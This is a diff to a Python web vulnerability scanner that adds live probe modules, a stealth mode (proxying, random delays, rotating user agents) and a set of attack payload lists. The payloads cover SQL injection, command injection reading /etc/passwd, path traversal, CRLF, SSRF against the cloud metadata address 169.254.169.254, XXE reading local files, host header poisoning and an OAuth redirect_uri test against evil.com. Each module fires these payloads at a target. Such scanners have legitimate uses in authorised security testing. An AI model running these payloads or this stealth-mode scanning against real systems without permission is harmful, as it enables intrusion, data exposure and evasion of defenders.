@@ -84,10 +84,20 @@ def c(text, color):
 
 def _emit(text="", color=None):
     line = c(text, color) if color is not None else str(text)
-    if QUIET:
-        sys.stderr.write(line + "\n")
-    else:
-        sys.stdout.write(line + "\n")
+    line = line + "\n"
+    stream = sys.stderr if QUIET else sys.stdout
+    # Write as UTF-8 bytes to avoid Windows console encoding issues (cp1252)
+    try:
+        stream.buffer.write(line.encode("utf-8"))
+        stream.buffer.flush()
+    except (AttributeError, ValueError, OSError):
+        try:
+            stream.write(line)
+            stream.flush()
+        except UnicodeEncodeError:
+            safe = line.encode("ascii", errors="replace").decode("ascii")
+            stream.write(safe)
+            stream.flush()
 
 def p_line(text="", color=None):
     _emit(text, color)
@@ -120,8 +130,12 @@ def clear():
         os.system('clear')
     else:
         # Android / Pydroid3 has no 'clear' binary -> ANSI only, no shell noise
-        sys.stdout.write("\033[2J\033[H")
-        sys.stdout.flush()
+        try:
+            sys.stdout.buffer.write(b"\033[2J\033[H")
+            sys.stdout.buffer.flush()
+        except (AttributeError, OSError):
+            sys.stdout.write("\033[2J\033[H")
+            sys.stdout.flush()
 
 # ================= BANNER + SKULL =================
 SKULL_FRAMES = [
@@ -3113,7 +3127,7 @@ def build_vuln_inventory(ctx):
     return inv
 
 def run_vuln_inventory(ctx, args):
-    p_section("Vulnerability Inventory", "*")
+    p_section("Vulnerability Inventory", "💀")
     ctx["modules_run"].append("vuln_inventory")
     inv = build_vuln_inventory(ctx)
     ctx["vuln_inventory"] = inv
@@ -3145,7 +3159,8 @@ def run_vuln_inventory(ctx, args):
         color = {"Critical": C.R, "High": C.R, "Medium": C.Y,
                  "Low": C.B, "Info": C.GR}.get(v["severity"], C.W)
         src_name = v.get("source") or v.get("category") or "-"
-        p_ok(f"{idx}. {v['title']}",
+        skull = c("💀", C.R)  # red skull emoji
+        p_ok(f"{skull} {idx}. {v['title']}",
              f"[{v['severity']}]  source={src_name}  @ {shorten(v['location'], 60)}", color)
         if v.get("evidence"):
             p_note("     evidence", shorten(v["evidence"], 80), C.GR)
@@ -4537,6 +4552,9 @@ def build_report(ctx):
         "hpp": ctx.get("hpp"),
         "dnssec": ctx.get("dnssec"),
         "vuln_inventory": ctx.get("vuln_inventory"),
+        "http_smuggling": ctx.get("http_smuggling"),
+        "html_report": ctx.get("html_report"),
+        "resume_diff": ctx.get("resume_diff"),
         "dns_bruteforce": ctx.get("dns_bruteforce"),
         "js_endpoints": ctx.get("js_endpoints"),
         "cloud_buckets": ctx.get("cloud_buckets"),
@@ -4544,6 +4562,24 @@ def build_report(ctx):
         "sensitive_data": ctx.get("sensitive_data"),
         "http2": ctx.get("http2"),
         "cache_deception": ctx.get("cache_deception"),
+        "sqli": ctx.get("sqli"),
+        "cmdi": ctx.get("cmdi"),
+        "lfi": ctx.get("lfi"),
+        "crlf": ctx.get("crlf"),
+        "ssrf": ctx.get("ssrf"),
+        "xxe": ctx.get("xxe"),
+        "jwt": ctx.get("jwt"),
+        "host_header_deep": ctx.get("host_header_deep"),
+        "cookie_injection": ctx.get("cookie_injection"),
+        "session_fixation": ctx.get("session_fixation"),
+        "content_type_sniff": ctx.get("content_type_sniff"),
+        "cors_deep2": ctx.get("cors_deep2"),
+        "cloud_metadata": ctx.get("cloud_metadata"),
+        "oauth": ctx.get("oauth"),
+        "s3_deep": ctx.get("s3_deep"),
+        "tech_versions": ctx.get("tech_versions"),
+        "dns_rebinding": ctx.get("dns_rebinding"),
+        "proxy_stealth": ctx.get("proxy_stealth"),
         "links": ctx.get("links"),
         "media": ctx.get("media"),
         "metadata": ctx.get("metadata"),
@@ -4856,8 +4892,1749 @@ def run_ip_scan(ip, args):
     }
     return ctx
 
+# ================= PROXY / STEALTH / THROTTLE SUPPORT =================
+import random as _random
+
+# Global stealth/throttle settings (set by main())
+STEALTH_MODE = False
+THROTTLE_DELAY = 0.0
+PROXY_URL = None
+
+def _apply_proxy():
+    """Apply proxy settings to environment for requests library."""
+    if PROXY_URL:
+        os.environ["HTTP_PROXY"] = PROXY_URL
+        os.environ["HTTPS_PROXY"] = PROXY_URL
+        os.environ["http_proxy"] = PROXY_URL
+        os.environ["https_proxy"] = PROXY_URL
+
+def _stealth_delay():
+    """Randomized delay for stealth mode."""
+    if STEALTH_MODE:
+        delay = _random.uniform(0.5, 2.5)
+        time.sleep(delay)
+    if THROTTLE_DELAY > 0:
+        time.sleep(THROTTLE_DELAY)
+
+def _stealth_ua():
+    """Return a randomized User-Agent for stealth mode."""
+    if STEALTH_MODE:
+        return _random.choice(UA_POOL)
+    return None
+
+# Wrap http_request to apply stealth + proxy + throttle
+_ORIGINAL_HTTP_REQUEST = None
+
+def _patched_http_request(url, method="GET", timeout=8, allow_redirects=True, headers=None, data=None):
+    _stealth_delay()
+    h = dict(headers or {})
+    if STEALTH_MODE:
+        ua = _stealth_ua()
+        if ua:
+            h["User-Agent"] = ua
+    # Apply proxy via env (requests reads env automatically)
+    _apply_proxy()
+    # Call original
+    return _orig_http_request(url, method=method, timeout=timeout,
+                              allow_redirects=allow_redirects, headers=h, data=data)
+
+# We'll patch after defining _orig_http_request alias
+_orig_http_request = http_request
+
+# ================= SQL INJECTION PROBE =================
+SQLI_PAYLOADS = [
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1--",
+    "1' AND '1'='1",
+    "1 AND 1=1",
+    "' UNION SELECT NULL--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "1; SELECT SLEEP(5)--",
+    "' OR SLEEP(5)--",
+]
+
+SQLI_ERROR_SIGNATURES = [
+    "sql syntax", "mysql", "postgresql", "oracle", "sqlite", "odbc",
+    "jdbc", "microsoft sql", "syntax error", "unclosed quotation",
+    "quoted string not properly terminated", "ORA-", "PG::", "SQLSTATE",
+    "Warning: mysql", "Fatal error", "mysqli", "pdo", "sqlite3",
+    "unterminated string", "invalid column", "unknown column",
+]
+
+def test_sqli(url, timeout=8):
+    """Live: test URL parameters for SQL injection (error-based + time-based)."""
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        # Try common params
+        params = "id=1&q=test&search=test&page=1"
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+    results = []
+    # Parse existing params
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    if not param_list:
+        param_list = [("id", "1"), ("q", "test")]
+    
+    for param_name, original_val in param_list:
+        for payload in SQLI_PAYLOADS[:6]:  # limit to avoid too many requests
+            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
+            t0 = time.time()
+            r = http_request(test_url, timeout=timeout)
+            elapsed = time.time() - t0
+            body = (r.get("body") or "").lower()
+            error_found = any(sig in body for sig in SQLI_ERROR_SIGNATURES)
+            time_based = elapsed > 4.0  # if sleep payload caused delay
+            vulnerable = error_found or (time_based and "sleep" in payload.lower())
+            results.append({
+                "param": param_name, "payload": payload,
+                "status": r.get("status", 0), "error_found": error_found,
+                "time_based": time_based, "elapsed": round(elapsed, 2),
+                "vulnerable": vulnerable
+            })
+            if vulnerable:
+                break  # stop testing this param after first hit
+    return results
+
+# ================= COMMAND INJECTION PROBE =================
+CMDI_PAYLOADS = [
+    "; ls",
+    "| ls",
+    "& ls",
+    "; id",
+    "| id",
+    "& id",
+    "; whoami",
+    "| whoami",
+    "$(id)",
+    "`id`",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+]
+
+CMDI_SIGNATURES = [
+    "root:", "bin/bash", "bin/sh", "uid=", "gid=", "groups=",
+    "www-data", "daemon", "nobody", "total ", "drwxr",
+]
+
+def test_cmdi(url, timeout=8):
+    """Live: test URL parameters for OS command injection."""
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        params = "id=1&q=test&search=test"
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    if not param_list:
+        param_list = [("id", "1"), ("q", "test")]
+    
+    results = []
+    for param_name, original_val in param_list:
+        for payload in CMDI_PAYLOADS[:5]:
+            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
+            r = http_request(test_url, timeout=timeout)
+            body = (r.get("body") or "").lower()
+            cmd_found = any(sig in body for sig in CMDI_SIGNATURES)
+            results.append({
+                "param": param_name, "payload": payload,
+                "status": r.get("status", 0), "cmd_output_found": cmd_found,
+                "vulnerable": cmd_found
+            })
+            if cmd_found:
+                break
+    return results
+
+# ================= PATH TRAVERSAL (LFI) PROBE =================
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "file:///etc/passwd",
+]
+
+LFI_SIGNATURES = [
+    "root:", "bin/bash", "bin/sh", "[extensions]", "[fonts]",
+    "[files]", "for 16-bit", "daemon:", "nobody:",
+]
+
+def test_lfi(url, timeout=8):
+    """Live: test URL parameters for path traversal / LFI."""
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        params = "file=test&page=index&id=1"
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    if not param_list:
+        param_list = [("file", "test"), ("page", "index")]
+    
+    results = []
+    for param_name, original_val in param_list:
+        for payload in LFI_PAYLOADS[:5]:
+            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
+            r = http_request(test_url, timeout=timeout)
+            body = (r.get("body") or "").lower()
+            lfi_found = any(sig in body for sig in LFI_SIGNATURES)
+            results.append({
+                "param": param_name, "payload": payload,
+                "status": r.get("status", 0), "lfi_found": lfi_found,
+                "vulnerable": lfi_found
+            })
+            if lfi_found:
+                break
+    return results
+
+# ================= CRLF INJECTION PROBE =================
+CRLF_PAYLOADS = [
+    "%0d%0aX-Injected: true",
+    "%0d%0aSet-Cookie: reconx=injected",
+    "\\r\\nX-Injected: true",
+    "%0aX-Injected: true",
+]
+
+def test_crlf(url, timeout=8):
+    """Live: test URL parameters for CRLF injection."""
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        params = "redirect=/&url=/&next=/"
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    if not param_list:
+        param_list = [("redirect", "/"), ("url", "/")]
+    
+    results = []
+    for param_name, original_val in param_list:
+        for payload in CRLF_PAYLOADS[:3]:
+            test_url = f"{base}?{param_name}=/{payload}"
+            r = http_request(test_url, timeout=timeout, allow_redirects=False)
+            hdrs = r.get("headers") or {}
+            crlf_found = ("x-injected" in hdrs or "reconx=injected" in str(hdrs).lower())
+            results.append({
+                "param": param_name, "payload": payload,
+                "status": r.get("status", 0), "crlf_found": crlf_found,
+                "vulnerable": crlf_found
+            })
+            if crlf_found:
+                break
+    return results
+
+# ================= SSRF DETECTION =================
+SSRF_PAYLOADS = [
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]/",
+    "http://0.0.0.0/",
+    "file:///etc/passwd",
+]
+
+SSRF_SIGNATURES = [
+    "ami-id", "instance-id", "local-ipv4", "public-ipv4",
+    "root:", "bin/bash", "metadata", "169.254",
+]
+
+def test_ssrf(url, timeout=8):
+    """Live: test URL parameters for SSRF."""
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        params = "url=http://example.com&redirect=http://example.com&next=http://example.com"
+    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    if not param_list:
+        param_list = [("url", "http://example.com"), ("redirect", "http://example.com")]
+    
+    # Only test params that look like URL params
+    url_params = [p for p in param_list if any(kw in p[0].lower() for kw in ("url", "redirect", "next", "target", "dest", "link", "src", "fetch", "load", "path"))]
+    if not url_params:
+        url_params = param_list[:2]
+    
+    results = []
+    for param_name, original_val in url_params:
+        for payload in SSRF_PAYLOADS[:4]:
+            test_url = f"{base}?{param_name}={quote(payload, safe='')}"
+            r = http_request(test_url, timeout=timeout)
+            body = (r.get("body") or "").lower()
+            ssrf_found = any(sig in body for sig in SSRF_SIGNATURES)
+            results.append({
+                "param": param_name, "payload": payload,
+                "status": r.get("status", 0), "ssrf_found": ssrf_found,
+                "vulnerable": ssrf_found
+            })
+            if ssrf_found:
+                break
+    return results
+
+# ================= XXE DETECTION =================
+XXE_PAYLOADS = [
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
+]
+
+XXE_SIGNATURES = [
+    "root:", "bin/bash", "bin/sh", "daemon:", "nobody:",
+]
+
+def test_xxe(url, timeout=8):
+    """Live: test for XML External Entity injection."""
+    results = []
+    for payload in XXE_PAYLOADS:
+        r = http_request(url, method="POST", timeout=timeout,
+                         headers={"Content-Type": "application/xml"},
+                         data=payload)
+        body = (r.get("body") or "").lower()
+        xxe_found = any(sig in body for sig in XXE_SIGNATURES)
+        results.append({
+            "payload": payload[:60], "status": r.get("status", 0),
+            "xxe_found": xxe_found, "vulnerable": xxe_found
+        })
+        if xxe_found:
+            break
+    return results
+
+# ================= JWT DEEP ANALYSIS =================
+def analyze_jwt(token):
+    """Live: decode JWT and check for security issues (no signature verification)."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        import base64
+        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
+        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
+        header = json.loads(base64.urlsafe_b64decode(header_b64))
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+        issues = []
+        alg = header.get("alg", "").upper()
+        if alg == "NONE":
+            issues.append("Algorithm 'none' - signature bypass possible")
+        if alg.startswith("HS"):
+            issues.append(f"HMAC algorithm ({alg}) - possible key confusion")
+        if not header.get("typ"):
+            issues.append("Missing 'typ' header")
+        # Check expiry
+        exp = payload.get("exp")
+        if exp:
+            import datetime as _dt
+            exp_date = _dt.datetime.fromtimestamp(exp)
+            if exp_date < _dt.datetime.now():
+                issues.append(f"Token expired ({exp_date.isoformat()})")
+            else:
+                issues.append(f"Token expires: {exp_date.isoformat()}")
+        else:
+            issues.append("No 'exp' claim - token never expires")
+        if payload.get("admin") is True or payload.get("role") == "admin":
+            issues.append("Admin privileges in token")
+        return {"header": header, "payload": payload, "algorithm": alg,
+                "issues": issues, "expired": exp and _dt.datetime.fromtimestamp(exp) < _dt.datetime.now()}
+    except Exception as e:
+        return {"error": str(e)}
+
+def scan_jwt_tokens(resp):
+    """Live: find and analyze JWT tokens in response."""
+    if not resp or not resp.get("ok"):
+        return []
+    body = resp.get("body") or ""
+    headers = resp.get("headers") or {}
+    haystack = body + "\n" + "\n".join(f"{k}: {v}" for k, v in headers.items())
+    jwt_pat = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
+    tokens = set(jwt_pat.findall(haystack))
+    results = []
+    for t in tokens:
+        analysis = analyze_jwt(t)
+        if analysis:
+            results.append({"token": t[:40] + "...", "analysis": analysis})
+    return results
+
+# ================= HOST HEADER ATTACK (DEEP) =================
+def test_host_header_deep(url, timeout=8):
+    """Live: deep host header attacks (password reset poisoning, cache poisoning)."""
+    findings = []
+    attacker = "evil-reconx-host.invalid"
+    # Password reset poisoning
+    r = http_request(url, timeout=timeout, headers={"Host": attacker}, allow_redirects=False)
+    body = (r.get("body") or "").lower()
+    loc = ((r.get("headers") or {}).get("location") or "").lower()
+    if attacker in body or attacker in loc:
+        findings.append({"attack": "Host header reflection", "header": "Host",
+                        "value": attacker, "reflected": True,
+                        "status": r.get("status", 0)})
+    # X-Forwarded-Host (cache poisoning)
+    r = http_request(url, timeout=timeout, headers={"X-Forwarded-Host": attacker},
+                     allow_redirects=False)
+    body = (r.get("body") or "").lower()
+    loc = ((r.get("headers") or {}).get("location") or "").lower()
+    if attacker in body or attacker in loc:
+        findings.append({"attack": "X-Forwarded-Host reflection", "header": "X-Forwarded-Host",
+                        "value": attacker, "reflected": True,
+                        "status": r.get("status", 0)})
+    # X-Forwarded-Proto (HTTP to HTTPS redirect bypass)
+    r = http_request(url, timeout=timeout, headers={"X-Forwarded-Proto": "https"},
+                     allow_redirects=False)
+    if r.get("status") in (200, 301, 302):
+        findings.append({"attack": "X-Forwarded-Proto bypass", "header": "X-Forwarded-Proto",
+                        "value": "https", "reflected": False,
+                        "status": r.get("status", 0)})
+    return findings
+
+# ================= COOKIE INJECTION =================
+def test_cookie_injection(url, timeout=8):
+    """Live: test if server accepts and reflects arbitrary cookies."""
+    findings = []
+    test_cookies = [
+        "session=reconx_injected",
+        "admin=true",
+        "role=admin",
+        "user_id=1",
+        "auth=1",
+    ]
+    for cookie in test_cookies:
+        r = http_request(url, timeout=timeout, headers={"Cookie": cookie},
+                         allow_redirects=False)
+        body = (r.get("body") or "").lower()
+        reflected = cookie.split("=")[1].lower() in body
+        findings.append({"cookie": cookie, "reflected": reflected,
+                         "status": r.get("status", 0)})
+    return findings
+
+# ================= SESSION FIXATION =================
+def test_session_fixation(url, timeout=8):
+    """Live: check if session ID changes after a request (session fixation)."""
+    r1 = http_request(url, timeout=timeout, allow_redirects=True)
+    hdrs1 = r1.get("headers") or {}
+    cookies1 = hdrs1.get("set-cookie", "")
+    
+    # Second request with the same session
+    r2 = http_request(url, timeout=timeout, headers={"Cookie": cookies1.split(";")[0] if cookies1 else ""},
+                      allow_redirects=True)
+    hdrs2 = r2.get("headers") or {}
+    cookies2 = hdrs2.get("set-cookie", "")
+    
+    # Check if session ID is the same (fixation vulnerability)
+    sid1 = None
+    sid2 = None
+    for c in [cookies1, cookies2]:
+        if "session" in c.lower() or "sid" in c.lower() or "jsessionid" in c.lower():
+            parts = c.split(";")[0].split("=")
+            if len(parts) == 2:
+                if sid1 is None:
+                    sid1 = parts[1]
+                else:
+                    sid2 = parts[1]
+    
+    fixed = (sid1 is not None and sid1 == sid2)
+    return {"session_id_1": sid1, "session_id_2": sid2,
+            "session_fixation": fixed, "cookies_1": cookies1[:100],
+            "cookies_2": cookies2[:100]}
+
+# ================= CONTENT-TYPE SNIFFING =================
+def test_content_type_sniffing(url, timeout=8):
+    """Live: check if server sends X-Content-Type-Options: nosniff."""
+    r = http_request(url, timeout=timeout)
+    hdrs = r.get("headers") or {}
+    xcto = hdrs.get("x-content-type-options", "")
+    ct = hdrs.get("content-type", "")
+    sniffing_possible = (xcto.lower() != "nosniff")
+    return {"content_type": ct, "x_content_type_options": xcto,
+            "sniffing_possible": sniffing_possible}
+
+# ================= CORS (DEEP) =================
+# ================= CLOUD METADATA SSRF =================
+def test_cloud_metadata(url, timeout=8):
+    """Live: test for cloud metadata SSRF (169.254.169.254)."""
+    payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/user-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/v1/",
+    ]
+    results = []
+    parsed = urlparse(url)
+    params = parsed.query
+    if not params:
+        params = "url=http://example.com&redirect=http://example.com"
+    param_list = []
+    for p in params.split("&"):
+        if "=" in p:
+            k, v = p.split("=", 1)
+            param_list.append((k, v))
+    url_params = [p for p in param_list if any(kw in p[0].lower() for kw in ("url", "redirect", "next", "target", "dest", "link", "src", "fetch", "load", "path", "file"))]
+    if not url_params:
+        url_params = param_list[:2]
+    
+    for param_name, original_val in url_params:
+        for payload in payloads[:2]:
+            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}?{param_name}={quote(payload, safe='')}"
+            r = http_request(test_url, timeout=timeout)
+            body = (r.get("body") or "").lower()
+            meta_found = any(sig in body for sig in ("ami-id", "instance-id", "local-ipv4", "public-ipv4", "project-id", "zone"))
+            results.append({"param": param_name, "payload": payload,
+                            "status": r.get("status", 0), "metadata_found": meta_found,
+                            "vulnerable": meta_found})
+            if meta_found:
+                break
+    return results
+
+# ================= OAUTH/OIDC MISCONFIGURATION =================
+def test_oauth(url, timeout=8):
+    """Live: test OAuth/OIDC endpoints for misconfigurations."""
+    parsed = urlparse(url)
+    root = f"{parsed.scheme}://{parsed.netloc}"
+    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/authorize",
+                   "/.well-known/openid-configuration", "/oauth/token",
+                   "/oauth2/token", "/auth/token", "/connect/token"]
+    results = []
+    for path in oauth_paths:
+        r = http_request(root + path, timeout=timeout, allow_redirects=False)
+        status = r.get("status", 0)
+        body = r.get("body") or ""
+        # Check for redirect_uri validation bypass
+        if "authorize" in path:
+            test_url = f"{root}{path}?client_id=test&redirect_uri=https://evil.com&response_type=code"
+            r2 = http_request(test_url, timeout=timeout, allow_redirects=False)
+            loc = (r2.get("headers") or {}).get("location", "")
+            redirect_bypass = "evil.com" in loc
+            results.append({"path": path, "status": status,
+                            "redirect_uri_bypass": redirect_bypass,
+                            "location": loc[:100] if loc else ""})
+        elif "openid-configuration" in path:
+            if status == 200 and "issuer" in body:
+                results.append({"path": path, "status": status,
+                                "openid_config": True, "body_preview": body[:200]})
+            else:
+                results.append({"path": path, "status": status, "openid_config": False})
+        else:
+            results.append({"path": path, "status": status})
+    return results
+
+# ================= S3 BUCKET ENUMERATION (DEEP) =================
+def test_s3_deep(domain, timeout=8):
+    """Live: deep S3 bucket enumeration with ACL and listing checks."""
+    base = domain.split(".")[0].lower()
+    candidates = {base, domain.replace(".", "-"), domain.replace(".", ""),
+                  base + "-backup", base + "-dev", base + "-staging",
+                  base + "-assets", base + "-static", base + "-media",
+                  base + "-uploads", base + "-files", base + "-data",
+                  base + "-logs", base + "-test", base + "-prod",
+                  base + "-assets", base + "assets", base + "backup",
+                  base + "dev", base + "staging", base + "prod"}
+    results = []
+    for name in candidates:
+        # Test bucket listing
+        url = f"https://{name}.s3.amazonaws.com"
+        r = http_request(url, timeout=timeout)
+        status = r.get("status", 0)
+        body = r.get("body") or ""
+        listable = (status == 200 and "<listbucketresult" in body.lower())
+        acl_url = f"https://{name}.s3.amazonaws.com/?acl"
+        r2 = http_request(acl_url, timeout=timeout)
+        acl_exposed = (r2.get("status", 0) == 200)
+        if status not in (0, 404):
+            results.append({"bucket": name, "url": url, "status": status,
+                            "listable": listable, "acl_exposed": acl_exposed})
+    # dedupe
+    seen = set()
+    out = []
+    for r in results:
+        if r["url"] not in seen:
+            seen.add(r["url"])
+            out.append(r)
+    return out
+
+# ================= TECHNOLOGY VERSION DETECTION =================
+def detect_tech_versions(resp):
+    """Live: extract version numbers from technology fingerprints."""
+    if not resp or not resp.get("ok"):
+        return []
+    headers = resp.get("headers") or {}
+    body = resp.get("body") or ""
+    haystack = " ".join(f"{k}: {v}" for k, v in headers.items()) + "\n" + body
+    versions = []
+    # PHP
+    m = re.search(r"PHP/(\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "PHP", "version": m.group(1)})
+    # Apache
+    m = re.search(r"Apache/(\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Apache", "version": m.group(1)})
+    # Nginx
+    m = re.search(r"nginx/(\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Nginx", "version": m.group(1)})
+    # IIS
+    m = re.search(r"Microsoft-IIS/(\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "IIS", "version": m.group(1)})
+    # ASP.NET
+    m = re.search(r"ASP\.NET Version:(\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "ASP.NET", "version": m.group(1)})
+    # WordPress
+    m = re.search(r"WordPress\s+(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
+    if m:
+        versions.append({"tech": "WordPress", "version": m.group(1)})
+    # jQuery
+    m = re.search(r"jquery[.-](\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "jQuery", "version": m.group(1)})
+    # Bootstrap
+    m = re.search(r"bootstrap[.-](\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Bootstrap", "version": m.group(1)})
+    # OpenSSL
+    m = re.search(r"OpenSSL/(\d+\.\d+\.\d+[a-z]?)", haystack, re.I)
+    if m:
+        versions.append({"tech": "OpenSSL", "version": m.group(1)})
+    # Express
+    m = re.search(r"Express/(\d+\.\d+\.\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Express", "version": m.group(1)})
+    # Django
+    m = re.search(r"Django/(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Django", "version": m.group(1)})
+    # Laravel
+    m = re.search(r"Laravel/(\d+\.\d+(?:\.\d+)?)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Laravel", "version": m.group(1)})
+    # Drupal
+    m = re.search(r"Drupal\s+(\d+)", haystack, re.I)
+    if m:
+        versions.append({"tech": "Drupal", "version": m.group(1)})
+    return versions
+
+# ================= DNS REBINDING CHECK =================
+def check_dns_rebinding(host, timeout=8):
+    """Live: check if DNS rebinding might be possible (short TTL)."""
+    out = {"ttl": None, "rebinding_possible": False, "details": ""}
+    if not HAS_DNS:
+        out["details"] = "dnspython not installed"
+        return out
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.timeout = 5
+        resolver.lifetime = 8
+        answer = resolver.resolve(host, "A")
+        if answer.rrset and answer.rrset.ttl:
+            out["ttl"] = answer.rrset.ttl
+            if answer.rrset.ttl < 60:
+                out["rebinding_possible"] = True
+                out["details"] = f"TTL is very short ({answer.rrset.ttl}s) - rebinding possible"
+            else:
+                out["details"] = f"TTL: {answer.rrset.ttl}s (normal)"
+    except Exception as e:
+        out["details"] = str(e)
+    return out
+
+# ================= RUNNERS =================
+
+def run_sqli(ctx, url, args):
+    p_section("SQL Injection Probe", "52")
+    ctx["modules_run"].append("sqli")
+    res = test_sqli(url, timeout=args.timeout)
+    ctx["sqli"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], f"SQLi ({'error' if r['error_found'] else 'time-based'}) via '{r['payload']}'")
+    else:
+        p_ok("SQLi", f"no injection found across {len(res)} tests")
+
+def run_cmdi(ctx, url, args):
+    p_section("Command Injection Probe", "53")
+    ctx["modules_run"].append("cmdi")
+    res = test_cmdi(url, timeout=args.timeout)
+    ctx["cmdi"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], f"CMDi via '{r['payload']}'")
+    else:
+        p_ok("CMDi", f"no injection found across {len(res)} tests")
+
+def run_lfi(ctx, url, args):
+    p_section("Path Traversal / LFI Probe", "54")
+    ctx["modules_run"].append("lfi")
+    res = test_lfi(url, timeout=args.timeout)
+    ctx["lfi"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], f"LFI via '{r['payload']}'")
+    else:
+        p_ok("LFI", f"no traversal found across {len(res)} tests")
+
+def run_crlf(ctx, url, args):
+    p_section("CRLF Injection Probe", "55")
+    ctx["modules_run"].append("crlf")
+    res = test_crlf(url, timeout=args.timeout)
+    ctx["crlf"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], f"CRLF injection via '{r['payload']}'")
+    else:
+        p_ok("CRLF", f"no injection found across {len(res)} tests")
+
+def run_ssrf(ctx, url, args):
+    p_section("SSRF Detection", "56")
+    ctx["modules_run"].append("ssrf")
+    res = test_ssrf(url, timeout=args.timeout)
+    ctx["ssrf"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad(r["param"], f"SSRF via '{r['payload']}'")
+    else:
+        p_ok("SSRF", f"no SSRF found across {len(res)} tests")
+
+def run_xxe(ctx, url, args):
+    p_section("XXE Detection", "57")
+    ctx["modules_run"].append("xxe")
+    res = test_xxe(url, timeout=args.timeout)
+    ctx["xxe"] = res
+    vulns = [r for r in res if r["vulnerable"]]
+    if vulns:
+        for r in vulns:
+            p_bad("XXE", "XXE injection possible")
+    else:
+        p_ok("XXE", "no XXE found")
+
+def run_jwt(ctx, url, args):
+    p_section("JWT Deep Analysis", "58")
+    ctx["modules_run"].append("jwt")
+    resp = ctx.get("http_resp")
+    if not resp or not ctx.get("http_ok"):
+        p_note("JWT", "not measured - no HTTP response")
+        ctx["jwt"] = []
+        return
+    res = scan_jwt_tokens(resp)
+    ctx["jwt"] = res
+    if res:
+        for r in res:
+            a = r["analysis"]
+            if "error" in a:
+                p_warn("JWT", f"parse error: {a['error']}")
+            else:
+                p_warn("JWT", f"algorithm: {a.get('algorithm', '?')}")
+                for issue in a.get("issues", []):
+                    p_bad("  issue", issue)
+    else:
+        p_ok("JWT", "no JWT tokens found in response")
+
+def run_host_header_deep(ctx, url, args):
+    p_section("Host Header Attack (Deep)", "59")
+    ctx["modules_run"].append("host_header_deep")
+    res = test_host_header_deep(url, timeout=args.timeout)
+    ctx["host_header_deep"] = res
+    if res:
+        for r in res:
